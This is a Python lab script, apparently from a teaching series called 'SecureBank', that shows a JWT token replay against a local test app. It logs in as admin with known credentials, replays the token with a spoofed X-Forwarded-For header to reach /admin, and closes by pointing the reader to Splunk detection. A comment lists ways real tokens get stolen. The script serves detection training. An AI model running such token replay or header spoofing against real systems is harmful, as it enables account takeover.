#!/usr/bin/env python3
"""
SecureBank — Episode 3 Attack Script
JWT Token Theft + Privilege Escalation via Token Replay

Story:
  Step 1 → Login as normal user (user123) — get their token
  Step 2 → Login as admin — steal their token
  Step 3 → Replay admin token from a "different" context
  Step 4 → Access /admin endpoint that user123 cannot reach
  Step 5 → Watch Splunk catch the TOKEN_REPLAY_DETECTED event

Usage:
  python3 attack.py

Requirements:
  pip install requests
"""

import requests
import json
import time

BASE_URL = "http://localhost:3000"

# ── ANSI colors for terminal output ──
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
BLUE   = "\033[94m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def banner():
    print(f"""
{BOLD}{'='*60}{RESET}
{RED}{BOLD}  SecureBank — Episode 3 Attack{RESET}
  JWT Token Theft + Privilege Escalation
{BOLD}{'='*60}{RESET}
""")

def step(n, msg):
    print(f"\n{BLUE}{BOLD}[STEP {n}]{RESET} {msg}")
    print(f"{BLUE}{'─'*50}{RESET}")

def success(msg):
    print(f"  {GREEN}✓{RESET}  {msg}")

def fail(msg):
    print(f"  {RED}✗{RESET}  {msg}")

def info(msg):
    print(f"  {YELLOW}→{RESET}  {msg}")

def alert(msg):
    print(f"\n  {RED}{BOLD}⚠  ALERT: {msg}{RESET}")

# ══════════════════════════════════════════
# STEP 1: Login as normal user
# This simulates the attacker first
# establishing what a "normal" session looks like
# ══════════════════════════════════════════
def login(username, password):
    resp = requests.post(
        f"{BASE_URL}/login",
        json={"username": username, "password": password},
        headers={"Content-Type": "application/json"}
    )
    return resp

def get_me(token):
    resp = requests.get(
        f"{BASE_URL}/me",
        headers={"Authorization": f"Bearer {token}"}
    )
    return resp

def access_admin(token):
    resp = requests.get(
        f"{BASE_URL}/admin",
        headers={"Authorization": f"Bearer {token}"}
    )
    return resp


def run_attack():
    banner()

    # ─────────────────────────────────────
    # STEP 1: Confirm user123 cannot access /admin
    # ─────────────────────────────────────
    step(1, "Login as normal user (user123 / Testing12345)")

    resp = login("user123", "Testing12345")
    if resp.status_code != 200:
        fail(f"Login failed: {resp.json()}")
        return

    user_data = resp.json()
    user_token = user_data["access_token"]

    success(f"Logged in as: {user_data['user']['username']}")
    success(f"Role:         {user_data['user']['role']}")
    info(f"Token:        {user_token[:16]}...")

    # ─────────────────────────────────────
    # STEP 2: Try /admin with user token — should fail
    # ─────────────────────────────────────
    step(2, "Try to access /admin as user123 — should be blocked")

    time.sleep(0.5)
    resp = access_admin(user_token)

    if resp.status_code == 403:
        success(f"Correctly blocked — 403 Forbidden")
        info(f"Response: {resp.json()['reason']}")
    else:
        alert("Something is wrong — user123 should NOT have admin access!")
        return

    # ─────────────────────────────────────
    # STEP 3: Login as admin — capture their token
    # In a real attack this could be done via:
    # - Network sniffing (HTTP, not HTTPS)
    # - XSS stealing the token from localStorage
    # - Compromised log file with tokens in it
    # Here we simulate it directly
    # ─────────────────────────────────────
    step(3, "Login as admin — capture the Bearer token")

    time.sleep(0.5)
    resp = login("admin", "admin123")

    if resp.status_code != 200:
        fail(f"Admin login failed: {resp.json()}")
        return

    admin_data = resp.json()
    stolen_token = admin_data["access_token"]

    success(f"Admin login successful")
    success(f"Role:           {admin_data['user']['role']}")
    alert(f"Token captured: {stolen_token[:16]}...")
    info("In a real attack — this token was just stolen from memory, logs, or a network sniff")

    # ─────────────────────────────────────
    # STEP 4: Replay the stolen admin token
    # This is the actual attack —
    # we use admin's token without knowing their password
    # ─────────────────────────────────────
    step(4, "Replay stolen admin token — access /admin")

    time.sleep(0.5)

    # Simulate a slightly different request context
    # In a real scenario this would be from a different machine/IP
    headers = {
        "Authorization": f"Bearer {stolen_token}",
        "X-Forwarded-For": "10.0.0.99",  # simulated different IP
        "User-Agent": "python-requests/attacker"
    }

    resp = requests.get(f"{BASE_URL}/admin", headers=headers)

    if resp.status_code == 200:
        data = resp.json()
        alert("ADMIN PANEL ACCESSED WITH STOLEN TOKEN!")
        print(f"\n  {RED}{BOLD}Sensitive data exposed:{RESET}")
        print(f"  {json.dumps(data['data'], indent=4)}")
    else:
        fail(f"Access denied: {resp.status_code}")
        info(resp.json().get('reason', 'Unknown reason'))

    # ─────────────────────────────────────
    # STEP 5: Also replay against /me
    # to prove token works for identity theft too
    # ─────────────────────────────────────
    step(5, "Verify identity theft — who does the server think we are?")

    time.sleep(0.5)
    resp = get_me(stolen_token)

    if resp.status_code == 200:
        identity = resp.json()
        alert(f"Server thinks we are: {identity['username']} (role: {identity['role']})")
        info("The server has no way to tell this is a replay — the token is valid")
    else:
        fail("Could not verify identity")

    # ─────────────────────────────────────
    # SUMMARY
    # ─────────────────────────────────────
    print(f"""
{BOLD}{'='*60}{RESET}
{RED}{BOLD}  ATTACK SUMMARY{RESET}
{BOLD}{'='*60}{RESET}

  What happened:
  1. Logged in as user123 — confirmed no admin access
  2. Logged in as admin   — captured Bearer token
  3. Replayed token       — accessed /admin panel
  4. Stole identity       — server confirmed us as admin

  What Splunk should now show:
  → TOKEN_REPLAY_DETECTED event in security.log
  → ADMIN_ACCESS from a different IP than token was issued
  → Two LOGIN_SUCCESS events in quick succession

  What this means in the real world:
  → Token theft is silent — no failed login attempts
  → Attacker leaves almost no footprint
  → This is why token expiry + IP binding matter

{BOLD}{'='*60}{RESET}
  Now check your Splunk dashboard — the evidence is there.
{BOLD}{'='*60}{RESET}
""")


if __name__ == "__main__":
    run_attack()